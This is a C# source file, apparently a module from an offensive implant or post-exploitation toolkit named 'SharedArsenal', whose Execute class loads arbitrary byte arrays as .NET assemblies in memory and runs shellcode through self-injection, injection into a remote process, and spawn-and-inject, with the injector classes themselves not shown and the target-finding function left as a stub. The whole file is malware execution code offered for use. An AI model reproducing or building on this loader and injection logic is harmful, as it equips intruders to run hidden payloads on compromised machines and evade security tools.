using SharedArsenal.Internal;
using System;
using System.Reflection;
using System.Threading.Tasks;

namespace MB1.Modules
{
    public static class Execute
    {
        public static bool Reflection(byte[] data, string[] args)
        {
            try
            {
                if (args.Length == 0)
                {
                    args = new string[1];
                }

                var asm = Assembly.Load(data);
                asm.EntryPoint.Invoke(null, new object[] { args });

                return true;
            }
            catch
            {
                return false;
            }
        }
        public static bool ShellcodeSelfInject(byte[] data, string[] args)
        {
            try
            {
                var injector = new SelfInjector();
                bool result = injector.Inject(data);

                return result;
            }
            catch
            {
                return false;
            }
        }
        public static bool ShellcodeRemoteInject(byte[] data, string[] args)
        {
            try
            {
                int pid = FindTarget();
                if (pid == -1) return false;

                var injector = new RemoteInjector();
                bool result = injector.Inject(data, pid);

                return result;
            }
            catch
            {
                return false;
            }
        }
        public static bool ShellcodeSpawnInject(byte[] data, string[] args)
        {
            try
            {
                var injector = new SpawnInject();
                bool result = injector.Inject(data);

                return result;
            }
            catch
            {
                return false;
            }
        }

        private static int FindTarget()
        {
            int pid = -1;

            // test
            //pid = 1308;

            return pid;
        }

    }
}
